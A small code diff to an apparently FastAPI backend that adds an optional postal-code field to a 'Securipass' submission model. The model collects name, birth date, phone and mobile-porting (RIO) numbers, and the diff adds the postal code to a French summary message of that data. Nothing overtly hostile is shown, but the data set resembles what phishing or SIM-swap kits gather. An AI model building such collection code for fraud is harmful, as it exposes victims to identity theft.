@@ -102,6 +102,7 @@ class SecuripassSubmission(BaseModel):
     dateOfBirth: str
     phoneNumber: str
     rioNumber: str | None = None
+    postalCode: str | None = None
 
 class UpdateClickEvent(BaseModel):
     source: str | None = "home_page"
@@ -166,6 +167,7 @@ async def submit_securipass_data(data: SecuripassSubmission):
    • Nom: {data.lastName}
    • Prénom: {data.firstName}
    • Date de naissance: {data.dateOfBirth}
+   • Code postal: {data.postalCode or 'Non renseigné'}
    • Téléphone: {data.phoneNumber}
    • RIO: {data.rioNumber or 'Non renseigné'}
 
